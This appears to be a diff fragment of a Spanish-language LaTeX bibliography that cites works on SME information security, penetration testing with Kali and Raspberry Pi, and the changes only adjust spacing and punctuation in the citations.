 \bibitem{INTECO} \textsc{INTECO. (2012), Pérez San-José, Pablo(dirección)., Gutérrez, Cristina (coordinación)., Alvarez Alonso,Eduardo., García Pérez,Laura., de la Fuente Rodríguez, Susana .}\textsc{Recuperado de \url{https://www.incibe.es/file/Sp61c9ljOlMT7jcjbxYNVQ}},\textit{ Estudio sobre seguridad de la información y continuidad de negocio en las pymes españolas.}
@@ -1648,10 +1640,10 @@ Estados Unidos, Septiembre 2008.
 
 %\bibitem{offensive security} \textsc{Página oficial offensive security, (2016)}  \textsc{Recuperado de \url{https://www.offensive-security.com/}},
 
-\bibitem{kali} \textsc{González Pérez,Pablo., Sánchez Garecés, Germán., Soriano de la Cámara, Jose Miguel. (2015) } y \textsc{0xWORD},\textit{Pentesting con kali 2.0}, 
+\bibitem{kali} \textsc{González Pérez,Pablo., Sánchez Garecés, Germán., Soriano de la Cámara, Jose Miguel. (2015) } y \textsc{0xWORD}, \textit{Pentesting con kali 2.0}, 
 Madrid, España.
 
-\bibitem{Raspberry} \textsc{Moya Fernández, Francisco. (2016)}\textit{Taller de Raspberry.}  \textsc{Recuperado de\url{https://www.gitbook.com/book/franciscomoya/taller-de-raspberry-pi/details}},3 edición.
+\bibitem{Raspberry} \textsc{Moya Fernández, Francisco. (2016)} \textit{Taller de Raspberry.} \textsc{Recuperado de \url{https://www.gitbook.com/book/franciscomoya/taller-de-raspberry-pi/details}}, 3 edición.
 
 %\bibitem{wifi} \textsc{Página oficial de wi-fi alliance. (2016)}  \textsc{Recuperado de \url{http://www.wi-fi.org/}},
 
